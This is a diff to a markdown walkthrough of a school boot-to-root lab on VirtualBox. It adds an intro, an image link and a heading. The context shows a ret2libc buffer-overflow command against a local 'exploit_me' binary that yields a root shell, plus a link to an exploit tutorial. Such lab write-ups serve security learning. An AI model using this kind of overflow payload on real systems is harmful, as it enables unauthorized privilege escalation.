@@ -1,4 +1,12 @@
-# Main way
+# Main way #1 (Straightforward approach)
+
+## Intro
+
+Following these instructions will take you on the next journey from dirt to riches (or from boot to root, actually):
+
+![Main way #1](https://drive.google.com/uc?export=view&id=1x2MbWmjvXU4UcTLUOiahc21gpoFvElbx)
+
+## Breaking in
 
 Since bridged adapter is blocked in the school - I setup kali linux vm and boot-to-root vm through host-only adapter.
 I created local network through **VirtualBox->File->Host network manager**, and it's ip **192.168.56.1/24**.
@@ -164,7 +172,7 @@ Now we can run this command
 ./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'dumm' + '\xb7\xf8\xcc\x58'[::-1])")
 ```
 
-Whaaat is going on? Whoami? A im root! System has been hacked.
+Whaaat is going on? Whoami? A im root! System has been hacked. **You are root now!**
 
 Description of ret2lib exploit.
 https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
